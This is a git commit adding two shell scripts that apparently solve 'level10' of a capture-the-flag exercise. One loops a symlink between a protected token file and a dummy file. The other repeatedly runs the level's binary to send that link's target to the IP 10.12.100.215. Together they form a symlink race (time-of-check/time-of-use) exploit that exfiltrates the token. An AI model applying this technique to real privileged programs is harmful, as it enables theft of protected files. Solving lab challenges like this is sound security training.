a1daf10782509eddce5c9d9d10f763800a121f85
Soufiane El hamri <soufiane.hamri07@gmail.com>
2022-01-17 10:44:17 +0100

    add level09 to level14

---
+++ level10/Ressources/script1.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+while true
+do
+ln -fs /home/user/level10/token to;
+ln -fs tok to;
+done
---
+++ level10/Ressources/script2.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+while true
+do
+/home/user/level10/level10 to 10.12.100.215;
+done
